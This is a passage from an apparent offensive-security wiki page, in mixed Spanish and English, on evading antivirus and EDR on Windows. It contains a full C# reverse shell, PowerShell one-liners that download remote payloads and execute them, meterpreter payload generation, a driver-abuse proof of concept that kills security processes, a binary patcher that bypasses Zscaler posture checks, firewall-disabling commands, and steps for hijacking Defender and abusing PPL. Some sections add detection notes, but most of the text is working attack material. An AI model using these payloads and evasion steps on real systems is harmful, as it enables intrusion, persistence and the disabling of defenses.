o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de registro en Windows que permite a las aplicaciones y componentes del sistema **log events**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De forma similar a cómo AMSI es deshabilitado (bypassed) también es posible hacer que la función **`EtwEventWrite`** del proceso en espacio de usuario retorne inmediatamente sin registrar eventos. Esto se hace parcheando la función en memoria para que retorne de inmediato, deshabilitando efectivamente el registro ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory has been known for quite some time and it's still a very great way for running your post-exploitation tools without getting caught by AV.

Since the payload will get loaded directly into memory without touching disk, we will only have to worry about patching AMSI for the whole process.

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) already provide the ability to execute C# assemblies directly in memory, but there are different ways of doing so:

- **Fork\&Run**

It involves **spawning a new sacrificial process**, inject your post-exploitation malicious code into that new process, execute your malicious code and when finished, kill the new process. This has both its benefits and its drawbacks. The benefit to the fork and run method is that execution occurs **outside** our Beacon implant process. This means that if something in our post-exploitation action goes wrong or gets caught, there is a **much greater chance** of our **implant surviving.** The drawback is that you have a **greater chance** of getting caught by **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

It's about injecting the post-exploitation malicious code **into its own process**. This way, you can avoid having to create a new process and getting it scanned by AV, but the drawback is that if something goes wrong with the execution of your payload, there's a **much greater chance** of **losing your beacon** as it could crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> If you want to read more about C# Assembly loading, please check out this article [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) and their InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, check out [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) and [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), it's possible to execute malicious code using other languages by giving the compromised machine access **to the interpreter environment installed on the Attacker Controlled SMB share**.

By allowing access to the Interpreter Binaries and the environment on the SMB share you can **execute arbitrary code in these languages within memory** of the compromised machine.

The repo indicates: Defender still scans the scripts but by utilising Go, Java, PHP etc we have **more flexibility to bypass static signatures**. Testing with random un-obfuscated reverse shell scripts in these languages has proved successful.

## TokenStomping

Token stomping is a technique that allows an attacker to **manipulate the access token or a security product like an EDR or AV**, allowing them to reduce its privileges so the process won't die but it won't have permissions to check for malicious activities.

To prevent this Windows could **prevent external processes** from getting handles over the tokens of security processes.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

As described in [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), it's easy to just deploy the Chrome Remote Desktop in a victims PC and then use it to takeover it and maintain persistence:
1. Download from https://remotedesktop.google.com/, click on "Set up via SSH", and then click on the MSI file for Windows to download the MSI file.
2. Run the installer silently in the victim (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Go back to the Chrome Remote Desktop page and click next. The wizard will then ask you to authorize; click the Authorize button to continue.
4. Execute the given parameter with some adjustments: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion is a very complicated topic, sometimes you have to take into account many different sources of telemetry in just one system, so it's pretty much impossible to stay completely undetected in mature environments.

Every environment you go against will have their own strengths and weaknesses.

I highly encourage you go watch this talk from [@ATTL4S](https://twitter.com/DaniLJ94), to get a foothold into more Advanced Evasion techniques.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

You can use [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) which will **remove parts of the binary** until it **finds out which part Defender** is finding as malicious and split it to you.\
Another tool doing the **same thing is** [**avred**](https://github.com/dobin/avred) with an open web offering the service in [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, all Windows came with a **Telnet server** that you could install (as administrator) doing:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que **se inicie** al arrancar el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar telnet port** (stealth) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilita la opción _Disable TrayIcon_
- Establece una contraseña en _VNC Password_
- Establece una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **victim**

#### **Reverse connection**

El **attacker** debe **ejecutar dentro** de su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para captar una reverse **VNC connection**. Luego, dentro de la **victim**: inicia el demonio winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer las siguientes cosas

- No inicies `winvnc` si ya se está ejecutando o desencadenarás una [ventana emergente](https://i.imgur.com/1SROTTl.png). comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o hará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o desencadenarás una [ventana emergente](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El Defender actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otros tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Desactivando AV/EDR desde el espacio kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso los servicios AV protegidos con Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` del “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el driver posee una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio kernel** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**: BYOVD omite por completo las protecciones en espacio usuario; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel sin tener en cuenta PPL/PP, ELAM u otras medidas de hardening.

Detección / Mitigación
•  Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.  
•  Monitorear la creación de nuevos servicios *kernel* y alertar cuando un driver se cargue desde un directorio escribible por todos o no esté presente en la lista de permitidos.  
•  Vigilar handles en user-mode a objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Elusión de Posture Checks de Zscaler Client Connector mediante parcheo de binarios en disco

Zscaler’s **Client Connector** aplica reglas de posture de dispositivo localmente y se apoya en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones débiles de diseño hacen posible una evasión completa:

1. La evaluación de posture ocurre **totalmente del lado del cliente** (se envía un booleano al servidor).  
2. Los endpoints internos RPC solo validan que el ejecutable conectante esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Al **parchear cuatro binarios firmados en disco** ambos mecanismos pueden ser neutralizados:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre retorna `1`, por lo que cada verificación es conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso sin firmar) puede enlazarse a las tuberías RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazado por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Cortocircuitadas |

Extracto mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las comprobaciones de posture muestran **verde/cumplen**.
* Binarios sin firmar o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo las decisiones de confianza puramente del lado del cliente y las comprobaciones simples de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusar de Protected Process Light (PPL) para manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía firmante/nivel de modo que solo los procesos protegidos de igual o mayor nivel pueden manipularse entre sí. Desde un punto de vista ofensivo, si puedes lanzar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir funcionalidades benignas (p. ej., registro) en una primitiva de escritura restringida respaldada por PPL contra directorios protegidos usados por AV/EDR.

What makes a process run as PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las banderas: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un nivel de protección compatible que coincida con el firmante del binario (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes anti-malware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Niveles incorrectos fallarán en la creación.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Ayudante de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y reenvía los argumentos al EXE objetivo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se autoinicia y acepta un parámetro para escribir un archivo de registro en una ruta especificada por el invocador.
- Cuando se ejecuta como proceso PPL, la escritura del archivo ocurre con respaldo PPL.
- ClipUp no puede parsear rutas que contienen espacios; use rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar la ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Iniciar el PPL-capable LOLBIN (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (e.g., CreateProcessAsPPL).
2) Pasar el argumento de ruta de log de ClipUp para forzar la creación de un archivo en un directorio AV protegido (e.g., Defender Platform). Use nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (e.g., MsMpEng.exe), programe la escritura al arrancar antes de que el AV se inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo su arranque.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la ubicación; la primitiva está orientada a la corrupción más que a la inyección precisa de contenido.
- Requiere administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- La sincronización es crítica: el objetivo no debe estar abierto; la ejecución en el arranque evita bloqueos de archivos.

Detecciones
- Creación de procesos de `ClipUp.exe` con argumentos inusuales, especialmente si son iniciados por lanzadores no estándar, alrededor del arranque.
- Nuevos servicios configurados para auto-iniciar binarios sospechosos y que consistentemente se inician antes que Defender/AV. Investigar la creación/modificación de servicios antes de fallos en el arranque de Defender.
- Monitoreo de integridad de archivos en los binarios/Platform de Defender; creaciones/modificaciones de archivos inesperadas por procesos con banderas de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios no-AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden ejecutarse como PPL y bajo qué procesos padre; bloquear la invocación de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios de auto-inicio y monitorear la manipulación del orden de arranque.
- Asegurar que la protección contra manipulación (tamper protection) de Defender y las protecciones de early-launch estén habilitadas; investigar errores de inicio que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en los volúmenes que alojan herramientas de seguridad si es compatible con su entorno (probar exhaustivamente).

Referencias para PPL y herramientas
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`) y luego inicia los procesos de servicio de Defender desde allí (actualizando las rutas de servicio/registro en consecuencia). Esta selección confía en las entradas de directorio, incluidos los puntos de reanálisis de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por un atacante y lograr DLL sideloading o la interrupción del servicio.

Precondiciones
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o provocar la re-selección de la plataforma de Defender (reinicio del servicio en el arranque)
- Solo se requieren herramientas incorporadas (mklink)

Por qué funciona
- Defender bloquea escrituras en sus propias carpetas, pero su selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino se resuelva a una ruta protegida/confiable.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea en Platform un symlink de directorio de versión superior que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del activador (reinicio recomendado):
```cmd
shutdown /r /t 0
```
4) Verifique que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso en `C:\TMP\AV\` y la configuración del servicio/registro que refleje esa ubicación.

Opciones de post-explotación
- DLL sideloading/code execution: Drop/replace DLLs que Defender carga desde su directorio de la aplicación para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Eliminar el version-symlink para que en el siguiente inicio la ruta configurada no se resuelva y Defender falle al iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalada de privilegios por sí misma; requiere privilegios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams pueden mover la evasión en tiempo de ejecución fuera del implant del C2 y al propio módulo objetivo hookeando su Import Address Table (IAT) y enrutar APIs seleccionadas a través de código independiente de posición controlado por el atacante (PIC). Esto generaliza la evasión más allá de la pequeña superficie de API que exponen muchos kits (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y post‑exploitation DLLs.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplique el parche después de relocations/ASLR y antes del primer uso de la importación. Reflective loaders como TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantenga los wrappers pequeños y PIC‑safe; resuelva la API verdadera vía el valor original de la IAT que capturó antes de parchear o vía LdrGetProcedureAddress.
- Use transiciones RW → RX para PIC y evite dejar páginas writable+executable.

Call‑stack spoofing stub
- Draugr‑style PIC stubs construyen una cadena de llamadas falsa (direcciones de retorno hacia módulos benignos) y luego pivotan hacia la API real.
- Esto derrota detecciones que esperan pilas canónicas desde Beacon/BOFs hacia APIs sensibles.
- Combínelo con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prologue de la API.

Integración operativa
- Anteponer el reflective loader a DLLs post‑ex para que el PIC y los hooks se inicialicen automáticamente cuando se cargue la DLL.
- Use un Aggressor script para registrar APIs objetivo de modo que Beacon y BOFs se beneficien de la misma ruta de evasión sin cambios de código.

Detección/DFIR — consideraciones
- IAT integrity: entradas que resuelven a direcciones non‑image (heap/anon); verificación periódica de pointers de import.
- Stack anomalies: direcciones de retorno que no pertenecen a imágenes cargadas; transiciones abruptas a PIC non‑image; ascendencia inconsistente de RtlUserThreadStart.
- Loader telemetry: escrituras in‑process en la IAT, actividad temprana en DllMain que modifica import thunks, regiones RX inesperadas creadas al load.
- Image‑load evasion: si se hookea LoadLibrary*, monitorice cargas sospechosas de assemblies de automation/clr correlacionadas con eventos de memory masking.

Bloques constructivos relacionados y ejemplos
- Reflective loaders que realizan IAT patching durante la carga (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) y stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
